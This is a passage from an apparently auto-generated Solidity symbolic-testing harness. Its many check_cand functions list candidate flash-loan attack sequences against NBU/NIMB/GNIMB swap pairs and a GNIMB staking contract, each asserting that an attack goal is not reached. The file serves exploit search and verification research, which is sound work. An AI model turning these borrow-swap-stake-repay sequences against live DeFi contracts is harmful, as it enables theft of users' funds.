        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nimb(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5559(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5560(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5561(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5562(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5563(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5564(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5565(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5566(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5567(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5568(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5569(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5570(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5571(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5572(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5573(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nimb(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5574(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5575(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5576(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5577(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5578(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5579(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nimb(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5580(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5581(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5582(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5583(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5584(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5585(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5586(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5587(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_gnimb(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5588(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5589(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5590(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5591(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5592(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5593(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_gnimb(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5594(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5595(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5596(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5597(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5598(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5599(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5600(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5601(
        uint256 amt0,
